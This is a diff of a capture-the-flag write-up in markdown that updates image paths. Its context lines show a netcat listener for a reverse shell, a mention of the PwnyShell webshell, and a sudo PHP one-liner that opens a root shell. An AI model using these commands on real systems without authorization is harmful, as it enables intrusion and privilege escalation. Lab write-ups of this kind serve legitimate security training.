@@ -170,15 +170,15 @@ nc -lvnp 7777
 
 And executing the file form the server to get a shell
 
-![](2_shell.png)
+![shell](../src/2_shell.png)
 
 In this case, I prefered a `webshell` so I used PwnyShell 
 
-![](2_pwnyshell.png)
+![](../src/2_pwnyshell.png)
 
 Now we look for the flag:
 
-![](02_flaguser.png)
+![](../src/02_flaguser.png)
 
 ### After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
 
@@ -202,6 +202,6 @@ Now we look for a php payload to root the shell and we get:
 sudo /usr/bin/php -r 'system("/bin/sh -i");'
 ```
 
-![](02_ROOT_FLAG.png)
+![](../src/02_ROOT_FLAG.png)
 
 AND WE GOT THE LAST FLAG 
